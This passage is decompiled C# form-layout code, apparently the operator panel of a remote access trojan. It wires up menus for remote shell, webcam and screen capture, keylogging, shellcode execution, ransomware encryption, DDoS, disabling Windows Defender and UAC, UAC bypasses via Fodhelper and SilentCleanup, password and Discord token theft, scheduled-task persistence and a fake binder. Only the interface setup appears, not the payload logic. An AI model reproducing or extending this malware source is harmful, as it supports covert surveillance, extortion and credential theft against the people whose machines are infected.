		//IL_03b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c0: Expected O, but got Unknown
		//IL_03c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_03cb: Expected O, but got Unknown
		//IL_03d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_03dc: Expected O, but got Unknown
		//IL_03e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ed: Expected O, but got Unknown
		//IL_03ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f8: Expected O, but got Unknown
		//IL_03f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0403: Expected O, but got Unknown
		//IL_0404: Unknown result type (might be due to invalid IL or missing references)
		//IL_040e: Expected O, but got Unknown
		//IL_040f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0419: Expected O, but got Unknown
		//IL_041a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0424: Expected O, but got Unknown
		//IL_0425: Unknown result type (might be due to invalid IL or missing references)
		//IL_042f: Expected O, but got Unknown
		//IL_0430: Unknown result type (might be due to invalid IL or missing references)
		//IL_043a: Expected O, but got Unknown
		//IL_043b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0445: Expected O, but got Unknown
		//IL_0446: Unknown result type (might be due to invalid IL or missing references)
		//IL_0450: Expected O, but got Unknown
		//IL_0451: Unknown result type (might be due to invalid IL or missing references)
		//IL_045b: Expected O, but got Unknown
		//IL_045c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0466: Expected O, but got Unknown
		//IL_0467: Unknown result type (might be due to invalid IL or missing references)
		//IL_0471: Expected O, but got Unknown
		//IL_0472: Unknown result type (might be due to invalid IL or missing references)
		//IL_047c: Expected O, but got Unknown
		//IL_047d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0487: Expected O, but got Unknown
		//IL_0488: Unknown result type (might be due to invalid IL or missing references)
		//IL_0492: Expected O, but got Unknown
		//IL_0493: Unknown result type (might be due to invalid IL or missing references)
		//IL_049d: Expected O, but got Unknown
		//IL_049e: Unknown result type (might be due to invalid IL or missing references)
		//IL_04a8: Expected O, but got Unknown
		//IL_04a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_04b3: Expected O, but got Unknown
		//IL_04b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_04be: Expected O, but got Unknown
		//IL_04bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c9: Expected O, but got Unknown
		//IL_04ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d4: Expected O, but got Unknown
		//IL_04d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_04df: Expected O, but got Unknown
		//IL_04e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ea: Expected O, but got Unknown
		//IL_04eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_04f5: Expected O, but got Unknown
		//IL_04f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0500: Expected O, but got Unknown
		//IL_0501: Unknown result type (might be due to invalid IL or missing references)
		//IL_050b: Expected O, but got Unknown
		//IL_050c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0516: Expected O, but got Unknown
		//IL_0517: Unknown result type (might be due to invalid IL or missing references)
		//IL_0521: Expected O, but got Unknown
		//IL_0522: Unknown result type (might be due to invalid IL or missing references)
		//IL_052c: Expected O, but got Unknown
		//IL_052d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0537: Expected O, but got Unknown
		//IL_0538: Unknown result type (might be due to invalid IL or missing references)
		//IL_0542: Expected O, but got Unknown
		//IL_0543: Unknown result type (might be due to invalid IL or missing references)
		//IL_054d: Expected O, but got Unknown
		//IL_054e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0558: Expected O, but got Unknown
		//IL_0559: Unknown result type (might be due to invalid IL or missing references)
		//IL_0563: Expected O, but got Unknown
		//IL_0564: Unknown result type (might be due to invalid IL or missing references)
		//IL_056e: Expected O, but got Unknown
		//IL_0575: Unknown result type (might be due to invalid IL or missing references)
		//IL_057f: Expected O, but got Unknown
		//IL_0580: Unknown result type (might be due to invalid IL or missing references)
		//IL_058a: Expected O, but got Unknown
		//IL_19f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_215b: Unknown result type (might be due to invalid IL or missing references)
		//IL_2165: Expected O, but got Unknown
		//IL_25d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_2659: Unknown result type (might be due to invalid IL or missing references)
		//IL_267a: Unknown result type (might be due to invalid IL or missing references)
		//IL_27b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_282d: Unknown result type (might be due to invalid IL or missing references)
		//IL_2837: Expected O, but got Unknown
		//IL_2844: Unknown result type (might be due to invalid IL or missing references)
		//IL_284e: Expected O, but got Unknown
		//IL_285b: Unknown result type (might be due to invalid IL or missing references)
		//IL_2865: Expected O, but got Unknown
		//IL_29f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_2aa2: Unknown result type (might be due to invalid IL or missing references)
		//IL_2b3b: Unknown result type (might be due to invalid IL or missing references)
		//IL_2b5c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2c2a: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d4a: Unknown result type (might be due to invalid IL or missing references)
		//IL_2eeb: Unknown result type (might be due to invalid IL or missing references)
		//IL_2ef5: Expected O, but got Unknown
		//IL_2f03: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f56: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f60: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		contextMenuClient = new ContextMenuStrip(components);
		RemoteManagerToolStripMenuItem = new ToolStripMenuItem();
		RemoteShellToolStripMenuItem = new ToolStripMenuItem();
		RemoteScreenToolStripMenuItem = new ToolStripMenuItem();
		RemoteCameraToolStripMenuItem = new ToolStripMenuItem();
		remoteRegeditToolStripMenuItem = new ToolStripMenuItem();
		FileManagerToolStripMenuItem1 = new ToolStripMenuItem();
		ProcessManagerToolStripMenuItem = new ToolStripMenuItem();
		netstatToolStripMenuItem = new ToolStripMenuItem();
		RecordToolStripMenuItem = new ToolStripMenuItem();
		ProgramNotificationToolStripMenuItem = new ToolStripMenuItem();
		StartToolStripMenuItem1 = new ToolStripMenuItem();
		StopToolStripMenuItem2 = new ToolStripMenuItem();
		RemoteControlToolStripMenuItem = new ToolStripMenuItem();
		SendFileToolStripMenuItem1 = new ToolStripMenuItem();
		fromUrlToolStripMenuItem = new ToolStripMenuItem();
		SendFileToDiskToolStripMenuItem = new ToolStripMenuItem();
		SendFileToMemoryToolStripMenuItem = new ToolStripMenuItem();
		runShellcodeToolStripMenuItem = new ToolStripMenuItem();
		MessageBoxToolStripMenuItem = new ToolStripMenuItem();
		ChatToolStripMenuItem1 = new ToolStripMenuItem();
		VisteWebsiteToolStripMenuItem1 = new ToolStripMenuItem();
		ChangeWallpaperToolStripMenuItem1 = new ToolStripMenuItem();
		KeyloggerToolStripMenuItem1 = new ToolStripMenuItem();
		FileSearchToolStripMenuItem = new ToolStripMenuItem();
		MalwareToolStripMenuItem = new ToolStripMenuItem();
		dDOSToolStripMenuItem = new ToolStripMenuItem();
		RansomwareToolStripMenuItem = new ToolStripMenuItem();
		EncryptToolStripMenuItem = new ToolStripMenuItem();
		DecryptToolStripMenuItem = new ToolStripMenuItem();
		DisableWDToolStripMenuItem = new ToolStripMenuItem();
		PasswordRecoveryToolStripMenuItem = new ToolStripMenuItem();
		DisableUACToolStripMenuItem = new ToolStripMenuItem();
		SystemControlToolStripMenuItem = new ToolStripMenuItem();
		ClientControlToolStripMenuItem = new ToolStripMenuItem();
		StopToolStripMenuItem1 = new ToolStripMenuItem();
		RestartToolStripMenuItem1 = new ToolStripMenuItem();
		noSystemToolStripMenuItem = new ToolStripMenuItem();
		UpdateToolStripMenuItem = new ToolStripMenuItem();
		UninstallToolStripMenuItem = new ToolStripMenuItem();
		ClientFolderToolStripMenuItem = new ToolStripMenuItem();
		SystemToolStripMenuItem = new ToolStripMenuItem();
		ShutDownToolStripMenuItem = new ToolStripMenuItem();
		RebootToolStripMenuItem = new ToolStripMenuItem();
		LogoutToolStripMenuItem = new ToolStripMenuItem();
		BypassUACAToolStripMenuItem = new ToolStripMenuItem();
		SilentCleanupToolStripMenuItem = new ToolStripMenuItem();
		FodhelperToolStripMenuItem = new ToolStripMenuItem();
		RunasToolStripMenuItem = new ToolStripMenuItem();
		CompMgmtLauncherToolStripMenuItem = new ToolStripMenuItem();
		InstallToolStripMenuItem = new ToolStripMenuItem();
		SchtaskInstallToolStripMenuItem = new ToolStripMenuItem();
		SchtaskUninstallToolStripMenuItem = new ToolStripMenuItem();
		normalInstallToolStripMenuItem = new ToolStripMenuItem();
		normalUninstallToolStripMenuItem = new ToolStripMenuItem();
		justForFunToolStripMenuItem = new ToolStripMenuItem();
		InformationToolStripMenuItem = new ToolStripMenuItem();
		statusStrip1 = new StatusStrip();
		toolStripStatusLabel1 = new ToolStripStatusLabel();
		toolStripStatusLabel2 = new ToolStripStatusLabel();
		ping = new Timer(components);
		UpdateUI = new Timer(components);
		contextMenuLogs = new ContextMenuStrip(components);
		cLEARToolStripMenuItem = new ToolStripMenuItem();
		contextMenuThumbnail = new ContextMenuStrip(components);
		sTARTToolStripMenuItem = new ToolStripMenuItem();
		sTOPToolStripMenuItem = new ToolStripMenuItem();
		ThumbnailImageList = new ImageList(components);
		contextMenuTasks = new ContextMenuStrip(components);
		sendFileFromUrlToolStripMenuItem = new ToolStripMenuItem();
		downloadAndExecuteToolStripMenuItem = new ToolStripMenuItem();
		sENDFILETOMEMORYToolStripMenuItem1 = new ToolStripMenuItem();
		disableUACToolStripMenuItem1 = new ToolStripMenuItem();
		disableWDToolStripMenuItem1 = new ToolStripMenuItem();
		installSchtaskToolStripMenuItem = new ToolStripMenuItem();
		uPDATEToolStripMenuItem1 = new ToolStripMenuItem();
		autoKeyloggerToolStripMenuItem = new ToolStripMenuItem();
		fakeBinderToolStripMenuItem = new ToolStripMenuItem();
		toolStripSeparator4 = new ToolStripSeparator();
		dELETETASKToolStripMenuItem = new ToolStripMenuItem();
		performanceCounter1 = new PerformanceCounter();
		performanceCounter2 = new PerformanceCounter();
		notifyIcon1 = new NotifyIcon(components);
		TimerTask = new Timer(components);
		menuStrip1 = new MenuStrip();
		FileToolStripMenuItem = new ToolStripMenuItem();
		BuilderToolStripMenuItem = new ToolStripMenuItem();
		BlockToolStripMenuItem = new ToolStripMenuItem();
		SettingToolStripMenuItem = new ToolStripMenuItem();
		ExitToolStripMenuItem = new ToolStripMenuItem();
		HelpToolStripMenuItem = new ToolStripMenuItem();
		DocumentToolStripMenuItem = new ToolStripMenuItem();
		AboutToolStripMenuItem = new ToolStripMenuItem();
		splitContainer1 = new SplitContainer();
		tabControl1 = new TabControl();
		tabPage1 = new TabPage();
		listView1 = new ListView();
		lv_ip = new ColumnHeader();
		lv_country = new ColumnHeader();
		lv_group = new ColumnHeader();
		lv_hwid = new ColumnHeader();
		lv_user = new ColumnHeader();
		lv_camera = new ColumnHeader();
		lv_os = new ColumnHeader();
		lv_version = new ColumnHeader();
		lv_ins = new ColumnHeader();
		lv_admin = new ColumnHeader();
		lv_av = new ColumnHeader();
		lv_ping = new ColumnHeader();
		lv_act = new ColumnHeader();
		tabPage3 = new TabPage();
		listView3 = new ListView();
		tabPage4 = new TabPage();
		listView4 = new ListView();
		columnHeader4 = new ColumnHeader();
		columnHeader5 = new ColumnHeader();
		listView2 = new ListView();
		columnHeader1 = new ColumnHeader();
		columnHeader2 = new ColumnHeader();
		ConnectTimeout = new Timer(components);
		DiscordRecoveryToolStripMenuItem = new ToolStripMenuItem();
		((Control)contextMenuClient).SuspendLayout();
		((Control)statusStrip1).SuspendLayout();
		((Control)contextMenuLogs).SuspendLayout();
		((Control)contextMenuThumbnail).SuspendLayout();
		((Control)contextMenuTasks).SuspendLayout();
		((ISupportInitialize)performanceCounter1).BeginInit();
		((ISupportInitialize)performanceCounter2).BeginInit();
		((Control)menuStrip1).SuspendLayout();
		((ISupportInitialize)splitContainer1).BeginInit();
		((Control)splitContainer1.get_Panel1()).SuspendLayout();
		((Control)splitContainer1.get_Panel2()).SuspendLayout();
		((Control)splitContainer1).SuspendLayout();
		((Control)tabControl1).SuspendLayout();
		((Control)tabPage1).SuspendLayout();
		((Control)tabPage3).SuspendLayout();
		((Control)tabPage4).SuspendLayout();
		((Control)this).SuspendLayout();
		((ToolStrip)contextMenuClient).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[8]
		{
			(ToolStripItem)RemoteManagerToolStripMenuItem,
			(ToolStripItem)RemoteControlToolStripMenuItem,
			(ToolStripItem)MalwareToolStripMenuItem,
			(ToolStripItem)SystemControlToolStripMenuItem,
			(ToolStripItem)BypassUACAToolStripMenuItem,
			(ToolStripItem)InstallToolStripMenuItem,
			(ToolStripItem)justForFunToolStripMenuItem,
			(ToolStripItem)InformationToolStripMenuItem
		});
		((Control)contextMenuClient).set_Name("contextMenuStrip1");
		((Control)contextMenuClient).set_Size(new Size(181, 202));
		((ToolStripDropDownItem)RemoteManagerToolStripMenuItem).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[9]
		{
			(ToolStripItem)RemoteShellToolStripMenuItem,
			(ToolStripItem)RemoteScreenToolStripMenuItem,
			(ToolStripItem)RemoteCameraToolStripMenuItem,
			(ToolStripItem)remoteRegeditToolStripMenuItem,
			(ToolStripItem)FileManagerToolStripMenuItem1,
			(ToolStripItem)ProcessManagerToolStripMenuItem,
			(ToolStripItem)netstatToolStripMenuItem,
			(ToolStripItem)RecordToolStripMenuItem,
			(ToolStripItem)ProgramNotificationToolStripMenuItem
		});
		((ToolStripItem)RemoteManagerToolStripMenuItem).set_Name("RemoteManagerToolStripMenuItem");
		((ToolStripItem)RemoteManagerToolStripMenuItem).set_Size(new Size(180, 22));
		((ToolStripItem)RemoteManagerToolStripMenuItem).set_Text("Surveillance");
		((ToolStripItem)RemoteShellToolStripMenuItem).set_Name("RemoteShellToolStripMenuItem");
		((ToolStripItem)RemoteShellToolStripMenuItem).set_Size(new Size(186, 22));
		((ToolStripItem)RemoteShellToolStripMenuItem).set_Text("Remote Shell");
		((ToolStripItem)RemoteShellToolStripMenuItem).add_Click((EventHandler)RemoteShellToolStripMenuItem_Click);
		((ToolStripItem)RemoteScreenToolStripMenuItem).set_Name("RemoteScreenToolStripMenuItem");
		((ToolStripItem)RemoteScreenToolStripMenuItem).set_Size(new Size(186, 22));
		((ToolStripItem)RemoteScreenToolStripMenuItem).set_Text("Remote Screen");
		((ToolStripItem)RemoteScreenToolStripMenuItem).add_Click((EventHandler)RemoteScreenToolStripMenuItem_Click);
		((ToolStripItem)RemoteCameraToolStripMenuItem).set_Name("RemoteCameraToolStripMenuItem");
		((ToolStripItem)RemoteCameraToolStripMenuItem).set_Size(new Size(186, 22));
		((ToolStripItem)RemoteCameraToolStripMenuItem).set_Text("Remote Camera");
		((ToolStripItem)RemoteCameraToolStripMenuItem).add_Click((EventHandler)RemoteCameraToolStripMenuItem_Click);
		((ToolStripItem)remoteRegeditToolStripMenuItem).set_Name("remoteRegeditToolStripMenuItem");
		((ToolStripItem)remoteRegeditToolStripMenuItem).set_Size(new Size(186, 22));
		((ToolStripItem)remoteRegeditToolStripMenuItem).set_Text("Remote Regedit");
		((ToolStripItem)remoteRegeditToolStripMenuItem).add_Click((EventHandler)remoteRegeditToolStripMenuItem_Click);
		((ToolStripItem)FileManagerToolStripMenuItem1).set_Name("FileManagerToolStripMenuItem1");
		((ToolStripItem)FileManagerToolStripMenuItem1).set_Size(new Size(186, 22));
		((ToolStripItem)FileManagerToolStripMenuItem1).set_Text("File Manager");
		((ToolStripItem)FileManagerToolStripMenuItem1).add_Click((EventHandler)FileManagerToolStripMenuItem1_Click);
		((ToolStripItem)ProcessManagerToolStripMenuItem).set_Name("ProcessManagerToolStripMenuItem");
		((ToolStripItem)ProcessManagerToolStripMenuItem).set_Size(new Size(186, 22));
		((ToolStripItem)ProcessManagerToolStripMenuItem).set_Text("Process Manager");
		((ToolStripItem)ProcessManagerToolStripMenuItem).add_Click((EventHandler)ProcessManagerToolStripMenuItem_Click);
		((ToolStripItem)netstatToolStripMenuItem).set_Name("netstatToolStripMenuItem");
		((ToolStripItem)netstatToolStripMenuItem).set_Size(new Size(186, 22));
		((ToolStripItem)netstatToolStripMenuItem).set_Text("Netstat");
		((ToolStripItem)netstatToolStripMenuItem).add_Click((EventHandler)netstatToolStripMenuItem_Click);
		((ToolStripItem)RecordToolStripMenuItem).set_Name("RecordToolStripMenuItem");
		((ToolStripItem)RecordToolStripMenuItem).set_Size(new Size(186, 22));
		((ToolStripItem)RecordToolStripMenuItem).set_Text("Record");
		((ToolStripItem)RecordToolStripMenuItem).add_Click((EventHandler)RecordToolStripMenuItem_Click);
		((ToolStripDropDownItem)ProgramNotificationToolStripMenuItem).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)StartToolStripMenuItem1,
			(ToolStripItem)StopToolStripMenuItem2
		});
		((ToolStripItem)ProgramNotificationToolStripMenuItem).set_Name("ProgramNotificationToolStripMenuItem");
		((ToolStripItem)ProgramNotificationToolStripMenuItem).set_Size(new Size(186, 22));
		((ToolStripItem)ProgramNotificationToolStripMenuItem).set_Text("Program Notification");
		((ToolStripItem)StartToolStripMenuItem1).set_Name("StartToolStripMenuItem1");
		((ToolStripItem)StartToolStripMenuItem1).set_Size(new Size(98, 22));
		((ToolStripItem)StartToolStripMenuItem1).set_Text("Start");
		((ToolStripItem)StartToolStripMenuItem1).add_Click((EventHandler)StartToolStripMenuItem1_Click);
		((ToolStripItem)StopToolStripMenuItem2).set_Name("StopToolStripMenuItem2");
		((ToolStripItem)StopToolStripMenuItem2).set_Size(new Size(98, 22));
		((ToolStripItem)StopToolStripMenuItem2).set_Text("Stop");
		((ToolStripItem)StopToolStripMenuItem2).add_Click((EventHandler)StopToolStripMenuItem2_Click);
		((ToolStripDropDownItem)RemoteControlToolStripMenuItem).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[8]
		{
			(ToolStripItem)SendFileToolStripMenuItem1,
			(ToolStripItem)runShellcodeToolStripMenuItem,
			(ToolStripItem)MessageBoxToolStripMenuItem,
			(ToolStripItem)ChatToolStripMenuItem1,
			(ToolStripItem)VisteWebsiteToolStripMenuItem1,
			(ToolStripItem)ChangeWallpaperToolStripMenuItem1,
			(ToolStripItem)KeyloggerToolStripMenuItem1,
			(ToolStripItem)FileSearchToolStripMenuItem
		});
		((ToolStripItem)RemoteControlToolStripMenuItem).set_Name("RemoteControlToolStripMenuItem");
		((ToolStripItem)RemoteControlToolStripMenuItem).set_Size(new Size(180, 22));
		((ToolStripItem)RemoteControlToolStripMenuItem).set_Text("Control");
		((ToolStripDropDownItem)SendFileToolStripMenuItem1).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[3]
		{
			(ToolStripItem)fromUrlToolStripMenuItem,
			(ToolStripItem)SendFileToDiskToolStripMenuItem,
			(ToolStripItem)SendFileToMemoryToolStripMenuItem
		});
		((ToolStripItem)SendFileToolStripMenuItem1).set_Name("SendFileToolStripMenuItem1");
		((ToolStripItem)SendFileToolStripMenuItem1).set_Size(new Size(180, 22));
		((ToolStripItem)SendFileToolStripMenuItem1).set_Text("Send File");
		((ToolStripItem)fromUrlToolStripMenuItem).set_Name("fromUrlToolStripMenuItem");
		((ToolStripItem)fromUrlToolStripMenuItem).set_Size(new Size(184, 22));
		((ToolStripItem)fromUrlToolStripMenuItem).set_Text("From Url");
		((ToolStripItem)fromUrlToolStripMenuItem).add_Click((EventHandler)fromUrlToolStripMenuItem_Click);
		((ToolStripItem)SendFileToDiskToolStripMenuItem).set_Name("SendFileToDiskToolStripMenuItem");
		((ToolStripItem)SendFileToDiskToolStripMenuItem).set_Size(new Size(184, 22));
		((ToolStripItem)SendFileToDiskToolStripMenuItem).set_Text("Send File To Disk");
		((ToolStripItem)SendFileToDiskToolStripMenuItem).add_Click((EventHandler)SendFileToDiskToolStripMenuItem_Click);
		((ToolStripItem)SendFileToMemoryToolStripMenuItem).set_Name("SendFileToMemoryToolStripMenuItem");
		((ToolStripItem)SendFileToMemoryToolStripMenuItem).set_Size(new Size(184, 22));
		((ToolStripItem)SendFileToMemoryToolStripMenuItem).set_Text("Send File To Memory");
		((ToolStripItem)SendFileToMemoryToolStripMenuItem).add_Click((EventHandler)SendFileToMemoryToolStripMenuItem_Click);
		((ToolStripItem)runShellcodeToolStripMenuItem).set_Name("runShellcodeToolStripMenuItem");
		((ToolStripItem)runShellcodeToolStripMenuItem).set_Size(new Size(180, 22));
		((ToolStripItem)runShellcodeToolStripMenuItem).set_Text("Run Shellcode");
		((ToolStripItem)runShellcodeToolStripMenuItem).add_Click((EventHandler)runShellcodeToolStripMenuItem_Click);
		((ToolStripItem)MessageBoxToolStripMenuItem).set_Name("MessageBoxToolStripMenuItem");
		((ToolStripItem)MessageBoxToolStripMenuItem).set_Size(new Size(180, 22));
		((ToolStripItem)MessageBoxToolStripMenuItem).set_Text("MessageBox");
		((ToolStripItem)MessageBoxToolStripMenuItem).add_Click((EventHandler)MessageBoxToolStripMenuItem_Click);
		((ToolStripItem)ChatToolStripMenuItem1).set_Name("ChatToolStripMenuItem1");
		((ToolStripItem)ChatToolStripMenuItem1).set_Size(new Size(180, 22));
		((ToolStripItem)ChatToolStripMenuItem1).set_Text("Chat");
		((ToolStripItem)ChatToolStripMenuItem1).add_Click((EventHandler)ChatToolStripMenuItem1_Click);
		((ToolStripItem)VisteWebsiteToolStripMenuItem1).set_Name("VisteWebsiteToolStripMenuItem1");
		((ToolStripItem)VisteWebsiteToolStripMenuItem1).set_Size(new Size(180, 22));
		((ToolStripItem)VisteWebsiteToolStripMenuItem1).set_Text("Viste Website");
		((ToolStripItem)VisteWebsiteToolStripMenuItem1).add_Click((EventHandler)VisteWebsiteToolStripMenuItem1_Click);
		((ToolStripItem)ChangeWallpaperToolStripMenuItem1).set_Name("ChangeWallpaperToolStripMenuItem1");
		((ToolStripItem)ChangeWallpaperToolStripMenuItem1).set_Size(new Size(180, 22));
		((ToolStripItem)ChangeWallpaperToolStripMenuItem1).set_Text("Change Wallpaper");
		((ToolStripItem)ChangeWallpaperToolStripMenuItem1).add_Click((EventHandler)ChangeWallpaperToolStripMenuItem1_Click);
		((ToolStripItem)KeyloggerToolStripMenuItem1).set_Name("KeyloggerToolStripMenuItem1");
		((ToolStripItem)KeyloggerToolStripMenuItem1).set_Size(new Size(180, 22));
		((ToolStripItem)KeyloggerToolStripMenuItem1).set_Text("Keylogger");
		((ToolStripItem)KeyloggerToolStripMenuItem1).add_Click((EventHandler)KeyloggerToolStripMenuItem1_Click);
		((ToolStripItem)FileSearchToolStripMenuItem).set_Name("FileSearchToolStripMenuItem");
		((ToolStripItem)FileSearchToolStripMenuItem).set_Size(new Size(180, 22));
		((ToolStripItem)FileSearchToolStripMenuItem).set_Text("File Search");
		((ToolStripItem)FileSearchToolStripMenuItem).add_Click((EventHandler)FileSearchToolStripMenuItem_Click);
		((ToolStripDropDownItem)MalwareToolStripMenuItem).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[6]
		{
			(ToolStripItem)dDOSToolStripMenuItem,
			(ToolStripItem)RansomwareToolStripMenuItem,
			(ToolStripItem)DisableWDToolStripMenuItem,
			(ToolStripItem)PasswordRecoveryToolStripMenuItem,
			(ToolStripItem)DiscordRecoveryToolStripMenuItem,
			(ToolStripItem)DisableUACToolStripMenuItem
		});
		((ToolStripItem)MalwareToolStripMenuItem).set_Name("MalwareToolStripMenuItem");
		((ToolStripItem)MalwareToolStripMenuItem).set_Size(new Size(180, 22));
		((ToolStripItem)MalwareToolStripMenuItem).set_Text("Malware");
		((ToolStripItem)dDOSToolStripMenuItem).set_Name("dDOSToolStripMenuItem");
		((ToolStripItem)dDOSToolStripMenuItem).set_Size(new Size(180, 22));
		((ToolStripItem)dDOSToolStripMenuItem).set_Text("DDOS");
		((ToolStripItem)dDOSToolStripMenuItem).add_Click((EventHandler)dDOSToolStripMenuItem_Click);
		((ToolStripDropDownItem)RansomwareToolStripMenuItem).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)EncryptToolStripMenuItem,
			(ToolStripItem)DecryptToolStripMenuItem
		});
		((ToolStripItem)RansomwareToolStripMenuItem).set_Name("RansomwareToolStripMenuItem");
		((ToolStripItem)RansomwareToolStripMenuItem).set_Size(new Size(180, 22));
		((ToolStripItem)RansomwareToolStripMenuItem).set_Text("Ransomware");
		((ToolStripItem)EncryptToolStripMenuItem).set_Name("EncryptToolStripMenuItem");
		((ToolStripItem)EncryptToolStripMenuItem).set_Size(new Size(115, 22));
		((ToolStripItem)EncryptToolStripMenuItem).set_Text("Encrypt");
		((ToolStripItem)EncryptToolStripMenuItem).add_Click((EventHandler)EncryptToolStripMenuItem_Click);
		((ToolStripItem)DecryptToolStripMenuItem).set_Name("DecryptToolStripMenuItem");
		((ToolStripItem)DecryptToolStripMenuItem).set_Size(new Size(115, 22));
		((ToolStripItem)DecryptToolStripMenuItem).set_Text("Decrypt");
		((ToolStripItem)DecryptToolStripMenuItem).add_Click((EventHandler)DecryptToolStripMenuItem_Click);
		((ToolStripItem)DisableWDToolStripMenuItem).set_Name("DisableWDToolStripMenuItem");
		((ToolStripItem)DisableWDToolStripMenuItem).set_Size(new Size(180, 22));
		((ToolStripItem)DisableWDToolStripMenuItem).set_Text("Disable WD");
		((ToolStripItem)DisableWDToolStripMenuItem).add_Click((EventHandler)DisableWDToolStripMenuItem_Click);
		((ToolStripItem)PasswordRecoveryToolStripMenuItem).set_Name("PasswordRecoveryToolStripMenuItem");
		((ToolStripItem)PasswordRecoveryToolStripMenuItem).set_Size(new Size(180, 22));
		((ToolStripItem)PasswordRecoveryToolStripMenuItem).set_Text("Password Recovery");
		((ToolStripItem)PasswordRecoveryToolStripMenuItem).add_Click((EventHandler)PasswordRecoveryToolStripMenuItem_Click);
		((ToolStripItem)DisableUACToolStripMenuItem).set_Name("DisableUACToolStripMenuItem");
		((ToolStripItem)DisableUACToolStripMenuItem).set_Size(new Size(180, 22));
		((ToolStripItem)DisableUACToolStripMenuItem).set_Text("Disable UAC");
		((ToolStripItem)DisableUACToolStripMenuItem).add_Click((EventHandler)DisableUACToolStripMenuItem_Click);
		((ToolStripDropDownItem)SystemControlToolStripMenuItem).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)ClientControlToolStripMenuItem,
			(ToolStripItem)SystemToolStripMenuItem
		});
		((ToolStripItem)SystemControlToolStripMenuItem).set_Name("SystemControlToolStripMenuItem");
		((ToolStripItem)SystemControlToolStripMenuItem).set_Size(new Size(180, 22));
		((ToolStripItem)SystemControlToolStripMenuItem).set_Text("System Control");
		((ToolStripDropDownItem)ClientControlToolStripMenuItem).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[6]
		{
			(ToolStripItem)StopToolStripMenuItem1,
			(ToolStripItem)RestartToolStripMenuItem1,
			(ToolStripItem)noSystemToolStripMenuItem,
			(ToolStripItem)UpdateToolStripMenuItem,
			(ToolStripItem)UninstallToolStripMenuItem,
			(ToolStripItem)ClientFolderToolStripMenuItem
		});
		((ToolStripItem)ClientControlToolStripMenuItem).set_Name("ClientControlToolStripMenuItem");
		((ToolStripItem)ClientControlToolStripMenuItem).set_Size(new Size(180, 22));
		((ToolStripItem)ClientControlToolStripMenuItem).set_Text("Client Control");
		((ToolStripItem)StopToolStripMenuItem1).set_Name("StopToolStripMenuItem1");
		((ToolStripItem)StopToolStripMenuItem1).set_Size(new Size(141, 22));
		((ToolStripItem)StopToolStripMenuItem1).set_Text("Stop");
		((ToolStripItem)StopToolStripMenuItem1).add_Click((EventHandler)StopToolStripMenuItem1_Click);
		((ToolStripItem)RestartToolStripMenuItem1).set_Name("RestartToolStripMenuItem1");
		((ToolStripItem)RestartToolStripMenuItem1).set_Size(new Size(141, 22));
		((ToolStripItem)RestartToolStripMenuItem1).set_Text("Restart");
		((ToolStripItem)RestartToolStripMenuItem1).add_Click((EventHandler)RestartToolStripMenuItem1_Click);
		((ToolStripItem)noSystemToolStripMenuItem).set_Name("noSystemToolStripMenuItem");
		((ToolStripItem)noSystemToolStripMenuItem).set_Size(new Size(141, 22));
		((ToolStripItem)noSystemToolStripMenuItem).set_Text("No System");
		((ToolStripItem)noSystemToolStripMenuItem).add_Click((EventHandler)noSystemToolStripMenuItem_Click);
		((ToolStripItem)UpdateToolStripMenuItem).set_Name("UpdateToolStripMenuItem");
		((ToolStripItem)UpdateToolStripMenuItem).set_Size(new Size(141, 22));
		((ToolStripItem)UpdateToolStripMenuItem).set_Text("Update");
		((ToolStripItem)UpdateToolStripMenuItem).add_Click((EventHandler)UpdateToolStripMenuItem_Click);
		((ToolStripItem)UninstallToolStripMenuItem).set_Name("UninstallToolStripMenuItem");
		((ToolStripItem)UninstallToolStripMenuItem).set_Size(new Size(141, 22));
		((ToolStripItem)UninstallToolStripMenuItem).set_Text("Uninstall");
		((ToolStripItem)UninstallToolStripMenuItem).add_Click((EventHandler)UninstallToolStripMenuItem_Click);
		((ToolStripItem)ClientFolderToolStripMenuItem).set_Name("ClientFolderToolStripMenuItem");
		((ToolStripItem)ClientFolderToolStripMenuItem).set_Size(new Size(141, 22));
		((ToolStripItem)ClientFolderToolStripMenuItem).set_Text("Client Folder");
		((ToolStripItem)ClientFolderToolStripMenuItem).add_Click((EventHandler)ClientFolderToolStripMenuItem_Click);
